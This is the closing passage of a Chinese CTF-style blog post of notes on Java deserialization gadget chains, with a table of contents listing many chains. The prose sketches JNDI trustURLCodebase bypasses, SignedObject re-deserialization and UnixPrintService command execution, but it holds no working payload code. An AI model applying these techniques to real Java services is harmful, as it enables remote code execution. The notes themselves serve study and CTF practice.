二次反序列化上面 Gadget 因为是 JNDI 需要出网，所以通常被认为限制很高，因此还需要找无需出网的利用方式。其中一个常见的方式是使用 java.security.SignedObject 进行二次反序列化。

sun.print.UnixPrintService 直接执行命令的方式，这个类有诸多 get 方法，通过拼接字符串的方式执行系统命令。

原生类 UnixPrintService  前get()在unix下有用，rce  。这个类有诸多 get 方法，通过拼接字符串的方式执行系统命令。可惜这个类在高版本被移除

ysomap支持Java原生反序列化利用链、fastjson利用链、hessian利用链、xmldecoder、xstream

存在一种EL表达式动态执行指令的方式，但是条件是tomcat的版本在9.x以下，选用8最为稳定。POC如下

对于JDK版本11.0.1、8u191、7u201、6u211及以上，RMI和LDAP的trustURLCodebase已经被限制，但是还存在几种方法绕过。绕过方法一用本地恶意 Class 作为 Reference Factory
简单地说，就是要服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用。该恶意 Factory 类必须实现javax.naming.spi.ObjectFactory接口，实现该接口的 getObjectInstance() 方法。绕过方法二 利用 LDAP 返回序列化数据，触发本地 Gadget

#### sun源码 
下载地址:https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4



点击左下角的zip即可下载，然后解压。再进入到相应JDK的文件夹中，里面本来就有个src.zip的压缩包，我们解压到当前文件夹下，然后把之前源码包(jdk-af660750b2f4.zip)中/src/share/classes下的sun文件夹拷贝到src文件夹中去。打开IDEA，选择文件 ---&gt;项目结构 ---&gt;SDK ---&gt;源路径 ---&gt;把src文件夹添加到源路径下，


保存即可。
</code></pre>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item"></div>
      <div class="post-nav-item">
    <a href="/2024/08/19/%E7%BB%9F%E4%BF%A1UOS%E6%9F%90%E6%9C%8D%E5%8A%A1%E8%BF%9B%E7%A8%8B%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" rel="next" title="统信UOS某服务进程本地提权漏洞">
      统信UOS某服务进程本地提权漏洞 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E9%93%BE%E5%AD%90-ctf%E7%89%88"><span class="nav-number">1.</span> <span class="nav-text">我的链子  ctf版</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E4%BE%9D%E8%B5%96"><span class="nav-number">1.1.</span> <span class="nav-text">各种依赖</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hessian"><span class="nav-number">1.1.1.</span> <span class="nav-text">Hessian</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cc3-2-1"><span class="nav-number">1.1.2.</span> <span class="nav-text">cc3.2.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JAVASSIT"><span class="nav-number">1.1.3.</span> <span class="nav-text">JAVASSIT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jackson"><span class="nav-number">1.1.4.</span> <span class="nav-text">jackson</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#spring-aop"><span class="nav-number">1.1.5.</span> <span class="nav-text">spring-aop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#spring-context"><span class="nav-number">1.1.6.</span> <span class="nav-text">spring-context</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#aspectjweaver"><span class="nav-number">1.1.7.</span> <span class="nav-text">aspectjweaver</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xbean"><span class="nav-number">1.1.8.</span> <span class="nav-text">xbean</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.</span> <span class="nav-text">复用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%B7%E5%BC%80ldap"><span class="nav-number">1.2.1.</span> <span class="nav-text">起开ldap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%88%90%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.2.</span> <span class="nav-text">序列化成文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E5%BD%A2%E5%BC%8F%E9%83%BD%E4%B8%8D%E5%8F%98%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.3.</span> <span class="nav-text">什么形式都不变序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%88%90base64"><span class="nav-number">1.2.4.</span> <span class="nav-text">序列化成base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#evil-bytecode-1"><span class="nav-number">1.2.5.</span> <span class="nav-text">evil bytecode    1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E8%AE%BE%E7%BD%AE-Field"><span class="nav-number">1.2.6.</span> <span class="nav-text">反射设置 Field</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%BE%E4%BC%A0%E9%80%92%E6%96%B9%E6%B3%95"><span class="nav-number">1.3.</span> <span class="nav-text">链传递方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CC-%E4%BE%9D%E8%B5%96-%E5%90%8E-rce-instance-%E5%89%8DTransformer%E7%B1%BB%E7%9A%84-transform-%E6%96%B9%E6%B3%95%E3%80%82"><span class="nav-number">1.3.1.</span> <span class="nav-text">CC 依赖   后 rce&#x2F;instance   前Transformer类的 transform()方法。</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-InstantiateTransformer"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">1   InstantiateTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-InvokerTransformer"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">2    InvokerTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-ConstantTransformer"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">3   ConstantTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-ChainedTransformer"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">4    ChainedTransformer</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#javassit"><span class="nav-number">1.3.2.</span> <span class="nav-text">javassit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB-UnixPrintService-%E5%89%8Dget"><span class="nav-number">1.3.3.</span> <span class="nav-text">原生类 UnixPrintService  前get()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB-SignedObject"><span class="nav-number">1.3.4.</span> <span class="nav-text">原生类 SignedObject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BBBeanContextSupport-readObject%E6%B5%81%E7%A8%8B%E9%87%8C%E6%9C%89try-catch%E4%B8%94%E4%B8%8D%E5%BD%B1%E5%93%8D%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%9A%84%E7%B1%BB%E3%80%82-%E7%94%A8%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%B0%81%E8%A3%85%E5%90%8E%EF%BC%8C"><span class="nav-number">1.3.5.</span> <span class="nav-text">原生类BeanContextSupport  readObject流程里有try catch且不影响反序列化流程的类。 用动态代理封装后，</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB-java-util-Collections-ReverseComparator-%E6%9C%89CB%E4%BE%9D%E8%B5%96%E6%97%B6%E5%B8%B8%E7%94%A8-%E7%94%A8%E4%BA%8E%E7%94%9F%E6%88%90BeanComparator"><span class="nav-number">1.3.6.</span> <span class="nav-text">原生类 java.util.Collections$ReverseComparator  有CB依赖时常用  用于生成BeanComparator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shiro%E4%BE%9D%E8%B5%96-%E8%87%AA%E5%B8%A6%E7%9A%84CB-tomcat%E5%BA%94%E7%94%A8%E4%B8%8B%E5%8F%AF%E8%83%BD%E6%9C%89CC"><span class="nav-number">1.3.7.</span> <span class="nav-text">shiro依赖 自带的CB  tomcat应用下可能有CC</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#BeanComparator-%E5%90%8E%E5%8F%AFcompare-%E8%B0%83%E5%88%B0-invoketransform-transform-%E3%80%8B-rce-templateimpl"><span class="nav-number">1.3.7.0.1.</span> <span class="nav-text">BeanComparator  后可compare 调到 invoketransform.transform -》 rce | templateimpl</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.3.8.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hashtable-%E5%8E%9F%E7%94%9F%E7%B1%BB-equal-%E8%B0%83-AbstractMap-equals-%E8%B0%83lazymap-get-%E8%BF%99%E9%87%8C%E6%9C%89%E7%82%B9%E7%BB%95-%E7%85%A7%E7%9D%807%E7%9A%84%E9%93%BE%E5%AD%90%E6%94%B9"><span class="nav-number">1.3.9.</span> <span class="nav-text">Hashtable  原生类   equal 调 AbstractMap.equals 调lazymap.get()   这里有点绕 照着7的链子改</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LinkedHashSet-HashSet%E5%8E%9F%E7%94%9F%E7%B1%BB-source-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95get-7u21-8u20"><span class="nav-number">1.3.10.</span> <span class="nav-text">(LinkedHashSet)HashSet原生类  source-&gt;动态代理-&gt;任意方法get  7u21|8u20</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#7u21"><span class="nav-number">1.3.10.0.1.</span> <span class="nav-text">7u21</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8u20-LinkedHashSet%E4%B8%AD%E4%BE%9D%E6%AC%A1add%E4%B8%89%E4%B8%AA%E5%85%83%E7%B4%A0%EF%BC%9A%E5%8C%85%E8%A3%B9AnnotationInvocationHandler%E7%9A%84BeanContextSupport%E3%80%81templates%E3%80%81proxy%E3%80%82"><span class="nav-number">1.3.10.0.2.</span> <span class="nav-text">8u20  LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E7%B1%BB%E6%83%B3%E5%88%A9%E7%94%A8%E7%9A%84%E8%AF%9D%E5%B0%B1"><span class="nav-number">1.3.10.1.</span> <span class="nav-text">那么这个类想利用的话就</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TiedMapEntry-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E5%89%8D-BadAttributeValueExpException-toString-HashMap-hashCode-%E5%90%8E-TiedMapEntry-toString-hashCode-%E5%8F%AF%E8%A7%A6%E5%8F%91-LazyMap-get"><span class="nav-number">1.3.11.</span> <span class="nav-text">TiedMapEntry 原生类  前 BadAttributeValueExpException-&gt;toString   HashMap-&gt;hashCode()后    TiedMapEntry.toString()|hashCode()  可触发 LazyMap.get()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tostring-%E5%90%8E-get"><span class="nav-number">1.3.11.1.</span> <span class="nav-text">tostring   后 get()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hashcode-%E5%90%8E-get"><span class="nav-number">1.3.11.2.</span> <span class="nav-text">hashcode() 后 get()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB-HashMap-%E5%90%8E%E5%8F%AF%E8%B0%83-hashcode"><span class="nav-number">1.3.12.</span> <span class="nav-text">原生类 HashMap  后可调 hashcode()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB-BadAttributeValueExpException-%E5%90%8E-tostring"><span class="nav-number">1.3.13.</span> <span class="nav-text">原生类 BadAttributeValueExpException  后 tostring()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hessian-%E4%BD%9C%E4%B8%BA%E9%93%BE%E7%9A%84source%E7%82%B9-%E5%90%8E%E8%B7%9F-HashMap-put-%E8%80%8ChashMap-put%E5%90%8E%E9%9D%A2%E5%8F%AF%E8%B7%9F%E5%85%B6%E4%BB%96%E9%93%BE"><span class="nav-number">1.3.14.</span> <span class="nav-text">Hessian    作为链的source点  后跟 HashMap.put 而hashMap.put后面可跟其他链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E5%90%88ROME"><span class="nav-number">1.3.14.1.</span> <span class="nav-text">配合ROME</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%85%8D%E5%90%88Spring-PartiallyComparableAdvisorHolder%E9%93%BE"><span class="nav-number">1.3.14.1.1.</span> <span class="nav-text">配合Spring PartiallyComparableAdvisorHolder链</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%85%8D%E5%90%88Spring-AbstractBeanFactoryPointcutAdvisor%E9%93%BE"><span class="nav-number">1.3.14.1.2.</span> <span class="nav-text">配合Spring AbstractBeanFactoryPointcutAdvisor链</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%85%8D%E5%90%88Resin%E9%93%BE"><span class="nav-number">1.3.14.1.3.</span> <span class="nav-text">配合Resin链</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%85%8D%E5%90%88XBean%E9%93%BE"><span class="nav-number">1.3.14.1.4.</span> <span class="nav-text">配合XBean链</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROME"><span class="nav-number">1.3.15.</span> <span class="nav-text">ROME</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D-HashMap-hash-HashTable-reconstitutionPut-BadAttributeValueExpExcepti%E2%80%94%E2%80%94-EqualsBean"><span class="nav-number">1.3.15.0.1.</span> <span class="nav-text">前 HashMap.hash|HashTable.reconstitutionPut|BadAttributeValueExpExcepti——&gt;EqualsBean |</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%89%8D-%E6%9C%89AOC%E6%97%B6-HotSwappableTargetSource-ToStringBean-toString%E3%80%8A%E2%80%94-XString-equals-%E3%80%8A%E2%80%94HotSwappableTargetSource-equals"><span class="nav-number">1.3.15.0.1.1.</span> <span class="nav-text">前   有AOC时 HotSwappableTargetSource  ToStringBean.toString《—-XString.equals()《—HotSwappableTargetSource.equals()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%90%8E-ToStringBean-toString%E2%80%94%E2%80%93-TemplatesImpl-getOutputProperties-%E3%80%82"><span class="nav-number">1.3.15.0.1.2.</span> <span class="nav-text">后 ToStringBean.toString—–&gt;TemplatesImpl.getOutputProperties()   。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%90%8E-%E6%9C%89-JDBCRowset-ToStringBean-toString-JdbcRowSetImpl-getDatabaseMetaData"><span class="nav-number">1.3.15.0.1.3.</span> <span class="nav-text">后  有 JDBCRowset   ToStringBean.toString-&gt;JdbcRowSetImpl.getDatabaseMetaData()</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#AbstractMap-EqualsBean-TemplatesImpl"><span class="nav-number">1.3.15.0.2.</span> <span class="nav-text">AbstractMap-&gt;EqualsBean-&gt;TemplatesImpl</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LazyMap%E5%8E%9F%E7%94%9F%E7%B1%BB-%E5%90%8E-transform-%E5%8D%B3CC-%E5%89%8D-AnnotationInvocationHandler-TiedMapEntry"><span class="nav-number">1.3.16.</span> <span class="nav-text">LazyMap原生类  后 transform() 即CC  前  AnnotationInvocationHandler|TiedMapEntry</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#get-%E6%96%B9%E6%B3%95-%E5%90%8E-transform-%E5%89%8D-AnnotationInvocationHandler"><span class="nav-number">1.3.16.1.</span> <span class="nav-text">get()方法   后  transform()  前 AnnotationInvocationHandler</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Groovy"><span class="nav-number">1.3.17.</span> <span class="nav-text">Groovy</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MethodClosure"><span class="nav-number">1.3.17.1.</span> <span class="nav-text">MethodClosure</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#String-execute"><span class="nav-number">1.3.17.2.</span> <span class="nav-text">String.execute()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ConvertedClosure"><span class="nav-number">1.3.17.3.</span> <span class="nav-text">ConvertedClosure</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.3.17.4.</span> <span class="nav-text">反序列化</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplatesImpl%E4%BE%9D%E8%B5%96-newTransformer-RCE"><span class="nav-number">1.3.18.</span> <span class="nav-text">TemplatesImpl依赖     newTransformer &#x3D; RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TemplatesImpl-newTransformer-rce-%E5%89%8DTrAXFilter-InvokerTransformer-transform"><span class="nav-number">1.3.18.1.</span> <span class="nav-text">TemplatesImpl.newTransformer() rce   前TrAXFilter|InvokerTransformer.transform()</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%99%E9%87%8C%E6%9C%89%E6%9C%89%E4%B8%80%E7%82%B9%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%EF%BC%8C-HelloTemplatesImpl-java%EF%BC%8C%E4%B8%BB%E8%A6%81%E5%85%B6%E5%BF%85%E9%A1%BB%E7%BB%A7%E6%89%BF-AbstractTranslet-%E7%B1%BB-why"><span class="nav-number">1.3.18.1.1.</span> <span class="nav-text">这里有有一点需要注意， HelloTemplatesImpl.java，主要其必须继承 AbstractTranslet 类. why?????</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TrAXFilter-%E5%90%8EnewTransformer"><span class="nav-number">1.3.19.</span> <span class="nav-text">TrAXFilter  后newTransformer()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8TrAXFilter-%E6%9C%89CC%E6%97%B6%E5%8F%AF"><span class="nav-number">1.3.19.1.</span> <span class="nav-text">如何调用TrAXFilter  有CC时可</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TransformingComparator-%E5%89%8DPriorityQueue-%E5%90%8E-transformer-transform-%E5%8D%B3CC"><span class="nav-number">1.3.20.</span> <span class="nav-text">TransformingComparator  前PriorityQueue.  后   transformer.transform() 即CC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PriorityQueue-source-%E5%90%8E-Comparator-compare-%E5%8D%B3TransformingComparator-compare"><span class="nav-number">1.3.21.</span> <span class="nav-text">PriorityQueue  source. 后 Comparator.compare  即TransformingComparator.compare()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandler-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E5%90%8ELazyMap-get"><span class="nav-number">1.3.22.</span> <span class="nav-text">AnnotationInvocationHandler  原生类  后LazyMap.get()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#AnnotationInvocationHandler%E7%9A%84constructor-%E5%90%8ELazyMap-get-%E5%8F%AF%E5%8F%82%E7%85%A7%E5%BE%AE%E8%B0%83%E6%88%90%E5%85%B6%E4%BB%96%E7%B1%BB%E7%9A%84get"><span class="nav-number">1.3.22.1.</span> <span class="nav-text">AnnotationInvocationHandler的constructor    后LazyMap.get()   可参照微调成其他类的get();</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8Fget%E6%96%B9%E6%B3%95-%E5%85%B7%E4%BD%93%E7%9C%8B7u21"><span class="nav-number">1.3.22.2.</span> <span class="nav-text">动态代理可以调用任意get方法  具体看7u21</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Charger0</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Charger0</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
